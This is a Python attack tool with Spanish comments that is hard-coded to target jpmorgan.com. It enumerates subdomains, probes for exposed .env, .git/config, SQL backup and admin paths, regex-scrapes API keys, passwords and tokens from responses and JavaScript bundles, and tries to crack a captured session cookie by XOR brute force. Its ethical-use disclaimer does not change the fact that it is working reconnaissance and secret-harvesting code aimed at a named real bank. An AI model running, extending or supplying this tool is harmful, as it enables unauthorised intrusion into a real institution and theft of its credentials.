#!/usr/bin/env python3
"""
🔥 VENATOR-ULTIMA v2.0 - Sistema de Reducción Cero JP Morgan Chase
Autor: kaoru_triunfador
Protocolo: CRIBA-DEEP-SCAN v3.0
Estrategia: Reducción Total de Superficie en Clase Bancaria
"""

import requests
import socket
import re
import time
import concurrent.futures
import base64
import hashlib
import json
import os
from urllib.parse import urljoin
from collections import Counter
import math
import struct

# ============================================================================
# CONFIGURACIÓN DEL SISTEMA VENATOR
# ============================================================================

class VenatorConfig:
    """Configuración maestra del sistema de reducción"""
    
    # Dominio objetivo primario
    PRIMARY_DOMAIN = "jpmorgan.com"
    
    # Subdominios estratégicos para criba
    STRATEGIC_SUBDOMAINS = [
        'dev', 'test', 'api', 'portal', 'corp', 'internal',
        'staging', 'webmail', 'secure', 'gw', 'ext', 'admin',
        'dashboard', 'console', 'management', 'vault'
    ]
    
    # Extensiones de archivos de respaldo/residuos
    BACKUP_EXTENSIONS = [
        ".bak", ".old", ".save", ".tmp", "~", ".swp",
        ".txt", ".example", ".sample", ".1", ".backup",
        ".copy", ".orig", ".previous", ".temp"
    ]
    
    # Rutas críticas para descubrimiento
    CRITICAL_PATHS = [
        "/.env", "/.git/config", "/config.php", "/phpmyadmin/",
        "/info.php", "/debug/", "/robots.txt", "/backup.sql",
        "/appsettings.json", "/web.config", "/.htaccess",
        "/api/v0/", "/api/v1/", "/internal/", "/admin/"
    ]
    
    # Headers de detección de tecnologías
    DETECTION_HEADERS = [
        'Server', 'X-Powered-By', 'X-AspNet-Version',
        'X-Runtime', 'X-JPMC-Version', 'Set-Cookie'
    ]
    
    # Patrones para extracción de secretos
    SECRET_PATTERNS = {
        'api_key': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([^"\']{10,})["\']',
        'secret': r'["\']?secret["\']?\s*[:=]\s*["\']([^"\']{10,})["\']',
        'token': r'["\']?(?:access|bearer)[_-]?token["\']?\s*[:=]\s*["\']([^"\']{10,})["\']',
        'password': r'["\']?password["\']?\s*[:=]\s*["\']([^"\']{6,})["\']',
        'jwt': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
        'base64': r'[A-Za-z0-9+/]{40,}={0,2}'
    }

# ============================================================================
# MÓDULO DE CRIBA UNIVERSAL
# ============================================================================

class UniversalSieve:
    """Módulo principal de criba y descubrimiento"""
    
    def __init__(self, config):
        self.config = config
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        
        # Resultados almacenados
        self.discovered_subdomains = []
        self.active_endpoints = []
        self.found_secrets = []
        self.critical_files = []
    
    def scan_domain_existence(self, subdomain):
        """Verifica existencia de subdominio mediante resolución DNS"""
        target = f"{subdomain}.{self.config.PRIMARY_DOMAIN}"
        
        try:
            ip = socket.gethostbyname(target)
            return {'subdomain': target, 'ip': ip, 'status': 'ACTIVE'}
        except socket.gaierror:
            return {'subdomain': target, 'ip': None, 'status': 'INACTIVE'}
    
    def deep_backup_sieve(self, domain, target_file):
        """Escaneo profundo de archivos de respaldo"""
        print(f"[+] Criba de respaldo en: {domain}{target_file}")
        
        discoveries = []
        
        for ext in self.config.BACKUP_EXTENSIONS:
            variations = [f"{target_file}{ext}", f"{ext}{target_file}"]
            
            for variation in variations:
                url = f"https://{domain}{variation}"
                
                try:
                    response = self.session.get(url, timeout=4, allow_redirects=False)
                    
                    if response.status_code == 200:
                        print(f"  🔥 [TRIUNFO!] {url} - ACCESIBLE")
                        discoveries.append({
                            'url': url,
                            'status': 200,
                            'size': len(response.content)
                        })
                    elif response.status_code == 403:
                        print(f"  🔒 [Protegido] {variation} (403)")
                        discoveries.append({
                            'url': url,
                            'status': 403,
                            'info': 'Acceso denegado'
                        })
                except:
                    pass
        
        return discoveries
    
    def sector_audit_scan(self, subdomain):
        """Auditoría completa de un sector/subdominio"""
        print(f"[+] Auditoría de sector: {subdomain}")
        
        results = []
        
        for path in self.config.CRITICAL_PATHS:
            url = f"https://{subdomain}{path}"
            
            try:
                response = self.session.get(url, timeout=5, allow_redirects=True)
                
                if response.status_code == 200:
                    print(f"  🔥 [ACCESIBLE] {path} - 200 OK")
                    
                    # Analizar contenido en busca de secretos
                    content_analysis = self.analyze_content_for_secrets(response.text)
                    
                    results.append({
                        'url': url,
                        'status': 200,
                        'path': path,
                        'size': len(response.content),
                        'secrets_found': len(content_analysis),
                        'headers': dict(response.headers)
                    })
                    
                    if "info.php" in path:
                        print("    💡 INFO.PHP DETECTADO - Configuración del servidor expuesta")
                        
                elif response.status_code == 403:
                    print(f"  🔒 [Existente] {path} (403)")
                    
            except Exception as e:
                pass
        
        return results
    
    def execute_global_sieve(self):
        """Ejecuta criba global sobre todos los subdominios estratégicos"""
        print("\n" + "="*70)
        print("🌊 CRIBA UNIVERSAL JPMORGAN CHASE")
        print("="*70 + "\n")
        
        print("[FASE 1] Descubrimiento de superficie activa...")
        
        # Escaneo concurrente de subdominios
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(self.scan_domain_existence, sub) 
                      for sub in self.config.STRATEGIC_SUBDOMAINS]
            
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result['status'] == 'ACTIVE':
                    print(f"  🔥 [ACTIVO] {result['subdomain']} → {result['ip']}")
                    self.discovered_subdomains.append(result)
        
        print(f"\n[+] {len(self.discovered_subdomains)} subdominios activos localizados")
        
        print("\n[FASE 2] Auditoría profunda por sector...")
        
        for subdomain_info in self.discovered_subdomains:
            subdomain = subdomain_info['subdomain']
            
            # Auditoría de archivos críticos
            sector_results = self.sector_audit_scan(subdomain)
            self.active_endpoints.extend(sector_results)
            
            # Criba de respaldo en .env
            backup_results = self.deep_backup_sieve(subdomain, "/.env")
            self.critical_files.extend(backup_results)
            
            time.sleep(0.5)  # Evitar rate limiting
        
        print(f"\n[+] {len(self.active_endpoints)} endpoints críticos mapeados")
        print(f"[+] {len(self.critical_files)} archivos de respaldo localizados")
        
        return self.generate_siege_report()
    
    def analyze_content_for_secrets(self, content):
        """Analiza contenido en busca de secretos y datos sensibles"""
        secrets_found = []
        
        for secret_type, pattern in self.config.SECRET_PATTERNS.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0]
                
                secrets_found.append({
                    'type': secret_type,
                    'value': match[:50] + "..." if len(match) > 50 else match,
                    'length': len(match)
                })
        
        return secrets_found
    
    def generate_siege_report(self):
        """Genera reporte completo de la criba"""
        report = {
            'timestamp': time.time(),
            'target_domain': self.config.PRIMARY_DOMAIN,
            'discovered_subdomains': self.discovered_subdomains,
            'active_endpoints': self.active_endpoints,
            'critical_files': self.critical_files,
            'summary': {
                'total_subdomains': len(self.discovered_subdomains),
                'total_endpoints': len(self.active_endpoints),
                'total_secrets': sum(len(e.get('secrets_found', [])) for e in self.active_endpoints),
                'critical_vulnerabilities': len([e for e in self.active_endpoints if e['status'] == 200])
            }
        }
        
        # Guardar reporte
        filename = f"venator_siege_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4, default=str)
        
        print(f"\n📄 Reporte de criba guardado en: {filename}")
        
        # Mostrar resumen en consola
        self.print_siege_summary(report)
        
        return report
    
    def print_siege_summary(self, report):
        """Muestra resumen de la criba en consola"""
        print("\n" + "="*70)
        print("📊 RESUMEN DE CRIBA UNIVERSAL")
        print("="*70)
        
        print(f"\n🎯 Dominio objetivo: {report['target_domain']}")
        print(f"📍 Subdominios activos: {report['summary']['total_subdomains']}")
        print(f"🔓 Endpoints accesibles: {report['summary']['critical_vulnerabilities']}")
        print(f"💎 Secretos detectados: {report['summary']['total_secrets']}")
        
        # Mostrar hallazgos críticos
        critical = [e for e in report['active_endpoints'] if e['status'] == 200]
        
        if critical:
            print("\n🔥 HALLAZGOS CRÍTICOS:")
            for endpoint in critical[:5]:  # Mostrar solo los 5 más críticos
                print(f"  → {endpoint['url']}")
                if endpoint.get('secrets_found'):
                    print(f"    💡 {len(endpoint['secrets_found'])} secretos detectados")

# ============================================================================
# MÓDULO DE ANÁLISIS DE ENTROPÍA Y ESTRUCTURA
# ============================================================================

class EntropyAnalyzer:
    """Módulo de análisis de entropía y estructura de datos"""
    
    def __init__(self):
        self.results = []
    
    def calculate_shannon_entropy(self, data):
        """Calcula entropía de Shannon de un conjunto de datos"""
        if not data:
            return 0
        
        counter = Counter(data)
        entropy = 0
        
        for count in counter.values():
            p_x = count / len(data)
            entropy -= p_x * math.log2(p_x)
        
        return entropy
    
    def analyze_packet_entropy(self, url):
        """Analiza entropía de paquetes HTTP"""
        print(f"[+] Analizando entropía en: {url}")
        
        try:
            response = requests.get(url, timeout=10)
            data = response.content
            
            entropy = self.calculate_shannon_entropy(data)
            size = len(data)
            
            analysis = {
                'url': url,
                'size_bytes': size,
                'entropy': entropy,
                'entropy_per_byte': entropy,
                'classification': self.classify_entropy(entropy)
            }
            
            print(f"  📊 Tamaño: {size} bytes")
            print(f"  📊 Entropía: {entropy:.4f} bits/byte")
            print(f"  📊 Clasificación: {analysis['classification']}")
            
            if entropy < 7.5:
                print("  🔥 [GAP DETECTADO] Baja entropía - Estructura identificable")
                
                # Extraer texto legible
                plain_text = self.extract_plain_text(data)
                if plain_text:
                    print(f"  💡 Texto legible extraído: {len(plain_text)} caracteres")
                    
                    # Buscar rutas y recursos
                    resources = self.extract_resources(plain_text)
                    if resources:
                        print(f"  📍 Recursos localizados: {len(resources)}")
            
            self.results.append(analysis)
            return analysis
            
        except Exception as e:
            print(f"  ⚠️ Error en análisis: {e}")
            return None
    
    def classify_entropy(self, entropy):
        """Clasifica el nivel de entropía"""
        if entropy < 7.0:
            return "BAJA - Estructura fuerte (texto plano, datos repetitivos)"
        elif entropy < 7.8:
            return "MEDIA - Posible mezcla (datos parcialmente estructurados)"
        elif entropy < 7.95:
            return "ALTA - Bien cifrado (datos casi aleatorios)"
        else:
            return "MUY ALTA - Cifrado fuerte (datos casi perfectamente aleatorios)"
    
    def extract_plain_text(self, data):
        """Extrae texto legible de datos binarios"""
        try:
            # Intentar decodificar como UTF-8 primero
            text = data.decode('utf-8', errors='ignore')
            
            # Filtrar solo caracteres ASCII legibles
            clean_text = ''.join([c if 32 <= ord(c) < 127 else ' ' for c in text])
            
            # Buscar secuencias significativas
            sequences = re.findall(r'[A-Za-z0-9/\-:._ ]{4,}', clean_text)
            
            return ' '.join(sequences[:100])  # Limitar a 100 secuencias
        except:
            return None
    
    def extract_resources(self, text):
        """Extrae URLs y rutas de recursos del texto"""
        patterns = [
            r'src=["\']([^"\']+)["\']',
            r'href=["\']([^"\']+)["\']',
            r'["\'](/[a-zA-Z0-9_\-/.]+)["\']',
            r'https?://[a-zA-Z0-9._\-/]+'
        ]
        
        resources = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            resources.extend(matches)
        
        return list(set(resources))

# ============================================================================
# MÓDULO DE EXTRACCIÓN DE BÚNDLES Y ANÁLISIS JANUS
# ============================================================================

class BundleExtractor:
    """Módulo de extracción y análisis de bundles JavaScript"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def extract_developer_bundle(self, base_url, js_path):
        """Descarga y analiza bundles de desarrollo"""
        url = urljoin(base_url, js_path)
        print(f"[+] Extrayendo bundle: {url}")
        
        try:
            response = self.session.get(url, timeout=15)
            
            if response.status_code == 200:
                content = response.text
                print(f"  ✅ Bundle descargado ({len(content):,} caracteres)")
                
                # Análisis profundo
                analysis = self.deep_bundle_analysis(content)
                
                print(f"  📊 Endpoints API: {analysis['api_endpoints']}")
                print(f"  📊 Secretos detectados: {analysis['secrets_count']}")
                print(f"  📊 Comentarios: {analysis['comments_count']}")
                
                # Buscar lógica Janus específica
                janus_analysis = self.analyze_janus_logic(content)
                if janus_analysis:
                    print(f"  🔥 Lógica Janus detectada")
                
                return analysis
            else:
                print(f"  ❌ Error {response.status_code}")
                return None
                
        except Exception as e:
            print(f"  ⚠️ Error en extracción: {e}")
            return None
    
    def deep_bundle_analysis(self, content):
        """Análisis profundo de contenido de bundle"""
        
        # Buscar endpoints API
        api_patterns = [
            r'["\'](/api/v[0-9]/[^"\']+)["\']',
            r'["\'](https?://[^"\']+\.jpmorgan\.com[^"\']*)["\']',
            r'["\'](/[a-zA-Z0-9_\-/]+/v[0-9]/[^"\']+)["\']'
        ]
        
        api_endpoints = []
        for pattern in api_patterns:
            matches = re.findall(pattern, content)
            api_endpoints.extend(matches)
        
        # Buscar secretos
        secrets = []
        secret_patterns = VenatorConfig.SECRET_PATTERNS
        for secret_type, pattern in secret_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            secrets.extend([{'type': secret_type, 'value': m[:50]} for m in matches[:10]])
        
        # Buscar comentarios
        comments = re.findall(r'//[^\n]*|/\*[\s\S]*?\*/', content)
        
        return {
            'api_endpoints': list(set(api_endpoints))[:20],  # Limitar a 20
            'secrets_count': len(secrets),
            'secrets': secrets[:10],  # Mostrar solo 10
            'comments_count': len(comments),
            'sample_comments': comments[:5]
        }
    
    def analyze_janus_logic(self, content):
        """Análisis específico de lógica Janus"""
        janus_patterns = [
            r'janus[^=]*=[^;]+',
            r'janusCookie[^=]*=[^;]+',
            r'validateJanus[^{]+\{[\s\S]{0,500}\}',
            r'["\']janus["\'][^:]*:[^,]+'
        ]
        
        janus_matches = []
        for pattern in janus_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            janus_matches.extend(matches)
        
        return janus_matches[:10]  # Devolver primeros 10 matches

# ============================================================================
# MÓDULO DE DECODIFICACIÓN COOKIES Y ANÁLISIS F5
# ============================================================================

class CookieCryptanalyst:
    """Módulo de análisis criptográfico de cookies"""
    
    def __init__(self):
        self.results = []
    
    def analyze_ppnet_cookie(self, cookie_value):
        """Análisis de cookies ppnet de JPMorgan"""
        print(f"[+] Analizando cookie ppnet: {cookie_value[:50]}...")
        
        analysis = {'original': cookie_value}
        
        # Eliminar prefijo '!' si existe
        if cookie_value.startswith('!'):
            clean_value = cookie_value[1:]
            analysis['prefix'] = '!'
        else:
            clean_value = cookie_value
        
        # Intentar decodificación Base64
        try:
            decoded = base64.b64decode(clean_value.split(';')[0])
            analysis['base64_decoded'] = True
            analysis['decoded_hex'] = decoded.hex()
            analysis['decoded_length'] = len(decoded)
            
            print(f"  ✅ Base64 decodificado ({len(decoded)} bytes)")
            
            # Análisis de entropía
            entropy = self.calculate_entropy(decoded)
            analysis['entropy'] = entropy
            
            # Análisis de patrones
            patterns = self.analyze_patterns(decoded)
            analysis['patterns'] = patterns
            
            # Intentar extraer IPs F5
            ip_candidates = self.extract_f5_ips(decoded)
            if ip_candidates:
                analysis['f5_ips'] = ip_candidates
                print(f"  🔥 Posibles IPs internas F5 detectadas")
            
        except Exception as e:
            analysis['base64_decoded'] = False
            analysis['error'] = str(e)
            print(f"  ❌ Error en decodificación: {e}")
        
        self.results.append(analysis)
        return analysis
    
    def calculate_entropy(self, data):
        """Calcula entropía de datos binarios"""
        if len(data) == 0:
            return 0
        
        freq = Counter(data)
        entropy = 0
        
        for count in freq.values():
            p_x = count / len(data)
            entropy -= p_x * math.log2(p_x)
        
        return entropy
    
    def analyze_patterns(self, data):
        """Analiza patrones en datos binarios"""
        patterns = {
            'repeated_bytes': {},
            'common_bytes': [],
            'possible_xor_key': None
        }
        
        # Contar bytes repetidos
        byte_counter = Counter(data)
        repeated = {hex(b): c for b, c in byte_counter.items() if c > 1}
        patterns['repeated_bytes'] = dict(sorted(repeated.items(), key=lambda x: x[1], reverse=True)[:10])
        
        # Bytes más comunes (posibles claves XOR)
        common_bytes = byte_counter.most_common(5)
        patterns['common_bytes'] = [hex(b[0]) for b in common_bytes]
        
        # Intentar detectar clave XOR simple
        if len(data) > 10:
            # Buscar byte que al XOR produzca más caracteres ASCII
            best_key = None
            best_ascii_count = 0
            
            for key in range(256):
                ascii_count = sum(1 for b in data[:100] if 32 <= (b ^ key) <= 126)
                if ascii_count > best_ascii_count:
                    best_ascii_count = ascii_count
                    best_key = key
            
            if best_key and best_ascii_count > 20:  # Umbral mínimo
                patterns['possible_xor_key'] = hex(best_key)
        
        return patterns
    
    def extract_f5_ips(self, data):
        """Extrae posibles direcciones IP de balanceadores F5"""
        ip_candidates = []
        
        # Patrón típico de IP en datos F5
        if len(data) >= 4:
            # Primeros 4 bytes como posible IP
            try:
                ip_int = struct.unpack("<I", data[:4])[0]
                ip = f"{(ip_int >> 24) & 0xFF}.{(ip_int >> 16) & 0xFF}.{(ip_int >> 8) & 0xFF}.{ip_int & 0xFF}"
                ip_candidates.append(ip)
            except:
                pass
        
        return ip_candidates
    
    def universal_xor_sieve(self, hex_data):
        """Aplica criba XOR universal para encontrar texto legible"""
        bytes_data = bytes.fromhex(hex_data)
        print(f"[+] Aplicando criba XOR universal ({len(bytes_data)} bytes)")
        
        candidates = []
        
        for key in range(256):
            # Aplicar XOR y contar caracteres ASCII legibles
            decoded = bytes(b ^ key for b in bytes_data[:100])  # Solo primeros 100 bytes
            
            ascii_count = sum(1 for b in decoded if 32 <= b <= 126)
            if ascii_count > 30:  # Umbral significativo
                try:
                    text = decoded.decode('ascii', errors='ignore')
                    candidates.append({
                        'key': hex(key),
                        'ascii_count': ascii_count,
                        'sample': text[:50]
                    })
                except:
                    pass
        
        # Ordenar por cantidad de ASCII
        candidates.sort(key=lambda x: x['ascii_count'], reverse=True)
        
        return candidates[:10]  # Devolver top 10

# ============================================================================
# SISTEMA PRINCIPAL VENATOR-ULTIMA
# ============================================================================

class VenatorUltima:
    """Sistema principal de reducción cero JP Morgan Chase"""
    
    def __init__(self):
        self.config = VenatorConfig()
        self.sieve = UniversalSieve(self.config)
        self.entropy_analyzer = EntropyAnalyzer()
        self.bundle_extractor = BundleExtractor()
        self.cookie_analyst = CookieCryptanalyst()
        
        # Resultados consolidados
        self.consolidated_results = {}
    
    def execute_full_operation(self):
        """Ejecuta operación completa de reducción cero"""
        print("\n" + "="*80)
        print("🔥 VENATOR-ULTIMA v2.0 - OPERACIÓN REDUCCIÓN CERO JP MORGAN")
        print("="*80 + "\n")
        
        # FASE 1: Criba Universal
        print("[FASE 1] CRIBA UNIVERSAL DE SUPERFICIE")
        print("-" * 60)
        
        siege_report = self.sieve.execute_global_sieve()
        self.consolidated_results['siege'] = siege_report
        
        # FASE 2: Análisis de Entropía
        print("\n[FASE 2] ANÁLISIS DE ENTROPÍA Y ESTRUCTURA")
        print("-" * 60)
        
        # Analizar endpoints principales
        if siege_report['active_endpoints']:
            primary_urls = [e['url'] for e in siege_report['active_endpoints'][:3] if e['status'] == 200]
            
            for url in primary_urls:
                entropy_analysis = self.entropy_analyzer.analyze_packet_entropy(url)
        
        # FASE 3: Extracción de Bundles
        print("\n[FASE 3] EXTRACCIÓN Y ANÁLISIS DE BUNDLES")
        print("-" * 60)
        
        # Buscar bundles en subdominios activos
        for subdomain_info in self.sieve.discovered_subdomains[:3]:  # Limitar a 3
            subdomain = subdomain_info['subdomain']
            
            # Patrones comunes de bundles
            bundle_patterns = [
                "/js/build/",
                "/static/js/",
                "/assets/js/",
                "/dist/js/"
            ]
            
            for pattern in bundle_patterns:
                test_url = f"https://{subdomain}{pattern}"
                
                # Escaneo rápido de posibles bundles
                try:
                    response = requests.head(test_url, timeout=3)
                    if response.status_code == 200:
                        print(f"  🔍 Bundle potencial en: {test_url}")
                        
                        # Analizar bundle específico
                        bundle_analysis = self.bundle_extractor.extract_developer_bundle(
                            f"https://{subdomain}", 
                            pattern + "app.js"  # Ejemplo común
                        )
                except:
                    pass
        
        # FASE 4: Análisis Criptográfico
        print("\n[FASE 4] ANÁLISIS CRIPTOGRÁFICO DE COOKIES")
        print("-" * 60)
        
        # Cookie ppnet_6026 extraída anteriormente
        sample_cookie = "J4MPQkLM0cZ6tq+YRt/QlffcN/E45OocThoG6V0j26lj+NEzhhlysufmNuTMFwPqd+c8VRboZ8Cr3A=="
        cookie_analysis = self.cookie_analyst.analyze_ppnet_cookie(sample_cookie)
        
        # Aplicar criba XOR
        if cookie_analysis.get('decoded_hex'):
            xor_candidates = self.cookie_analyst.universal_xor_sieve(
                cookie_analysis['decoded_hex']
            )
            
            if xor_candidates:
                print(f"  🔥 {len(xor_candidates)} candidatos XOR identificados")
                for i, cand in enumerate(xor_candidates[:3]):
                    print(f"    {i+1}. Key {cand['key']}: {cand['sample']}")
        
        # FASE 5: Generación de Reporte Final
        print("\n[FASE 5] CONSOLIDACIÓN Y REPORTE FINAL")
        print("-" * 60)
        
        self.generate_final_report()
        
        print("\n" + "="*80)
        print("🎯 OPERACIÓN VENATOR-ULTIMA COMPLETADA")
        print("="*80)
    
    def generate_final_report(self):
        """Genera reporte final consolidado"""
        report = {
            'operation': 'VENATOR-ULTIMA v2.0',
            'timestamp': time.time(),
            'target': self.config.PRIMARY_DOMAIN,
            'phases': {
                'siege': len(self.sieve.discovered_subdomains),
                'entropy_analysis': len(self.entropy_analyzer.results),
                'bundle_analysis': 'completed',
                'cryptanalysis': len(self.cookie_analyst.results)
            },
            'critical_findings': self.extract_critical_findings(),
            'recommendations': self.generate_recommendations()
        }
        
        # Guardar reporte completo
        filename = f"venator_ultima_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4, default=str)
        
        print(f"  📄 Reporte final guardado en: {filename}")
        
        # Resumen ejecutivo
        self.print_executive_summary(report)
    
    def extract_critical_findings(self):
        """Extrae hallazgos críticos de todos los módulos"""
        critical = []
        
        # De la criba
        for endpoint in self.sieve.active_endpoints:
            if endpoint['status'] == 200 and endpoint.get('secrets_found'):
                critical.append({
                    'type': 'exposed_endpoint',
                    'url': endpoint['url'],
                    'secrets': endpoint['secrets_found']
                })
        
        # Del análisis de entropía
        for analysis in self.entropy_analyzer.results:
            if analysis.get('entropy', 8) < 7.5:
                critical.append({
                    'type': 'low_entropy_structure',
                    'url': analysis['url'],
                    'entropy': analysis['entropy']
                })
        
        # Del análisis criptográfico
        for cookie_analysis in self.cookie_analyst.results:
            if cookie_analysis.get('f5_ips'):
                critical.append({
                    'type': 'internal_ip_leak',
                    'source': 'cookie_decoding',
                    'ips': cookie_analysis['f5_ips']
                })
        
        return critical
    
    def generate_recommendations(self):
        """Genera recomendaciones basadas en hallazgos"""
        recommendations = [
            "1. Revisar y eliminar archivos de respaldo expuestos (.bak, .old, etc.)",
            "2. Implementar autenticación en endpoints de desarrollo/test",
            "3. Aumentar entropía en datos de respuesta para evitar análisis de estructura",
            "4. Rotar cookies de sesión y fortalecer cifrado de ppnet_*",
            "5. Limitar exposición de bundles de desarrollo en producción",
            "6. Implementar WAF con detección de criba automatizada",
            "7. Revisar logs para detectar patrones de escaneo similares",
            "8. Considerar implementación de honeypots en subdominios no utilizados"
        ]
        
        return recommendations
    
    def print_executive_summary(self, report):
        """Muestra resumen ejecutivo en consola"""
        print("\n📊 RESUMEN EJECUTIVO:")
        print("-" * 60)
        
        print(f"🎯 Objetivo: {report['target']}")
        print(f"📍 Subdominios activos: {report['phases']['siege']}")
        
        if report['critical_findings']:
            print(f"🔥 Hallazgos críticos: {len(report['critical_findings'])}")
            
            categories = {}
            for finding in report['critical_findings']:
                cat = finding['type']
                categories[cat] = categories.get(cat, 0) + 1
            
            for cat, count in categories.items():
                print(f"  • {cat}: {count}")
        else:
            print("✅ No se detectaron vulnerabilidades críticas")
        
        print("\n💡 Recomendaciones prioritarias:")
        for i, rec in enumerate(report['recommendations'][:3], 1):
            print(f"  {i}. {rec}")

# ============================================================================
# INTERFAZ DE USUARIO Y EJECUCIÓN
# ============================================================================

def main():
    """Función principal de Venator-Ultima"""
    
    banner = """
    ╔══════════════════════════════════════════════════════════════╗
    ║                 🔥 VENATOR-ULTIMA v2.0                         ║
    ║           Sistema de Reducción Cero JP Morgan Chase           ║
    ║                                                              ║
    ║  Protocolo: CRIBA-DEEP-SCAN v3.0                            ║
    ║  Estrategia: Reducción Total de Superficie                   ║
    ║  Autor: kaoru_triunfador                                     ║
    ╚══════════════════════════════════════════════════════════════╝
    """
    
    print(banner)
    
    # Advertencia de uso ético
    print("[!] ADVERTENCIA: Esta herramienta es para:")
    print("    • Auditorías de seguridad autorizadas")
    print("    • Pruebas de penetración con permiso")
    print("    • Investigación de seguridad en sistemas propios")
    print("    • Educación en ciberseguridad")
    print("\n[!] NUNCA usar en sistemas sin autorización explícita\n")
    
    # Confirmación
    try:
        confirm = input("[?] ¿Continuar con la operación? (s/N): ").strip().lower()
        
        if confirm != 's':
            print("[✗] Operación cancelada por el usuario")
            return
    except KeyboardInterrupt:
        print("\n[✗] Operación interrumpida")
        return
    
    # Ejecutar operación
    try:
        venator = VenatorUltima()
        venator.execute_full_operation()
        
    except KeyboardInterrupt:
        print("\n[✗] Operación interrumpida por el usuario")
    except Exception as e:
        print(f"\n[✗] Error crítico: {e}")
        print("[!] Verifica la conexión de red y configuración")

# ============================================================================
# PUNTO DE ENTRADA
# ============================================================================

if __name__ == "__main__":
    # Verificar dependencias
    required_modules = ['requests', 'socket', 're', 'concurrent', 'base64', 'hashlib', 'json', 'struct']
    
    missing = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing.append(module)
    
    if missing:
        print(f"[✗] Faltan dependencias: {', '.join(missing)}")
        print("[!] Instalar con: pip install requests")
    else:
        main()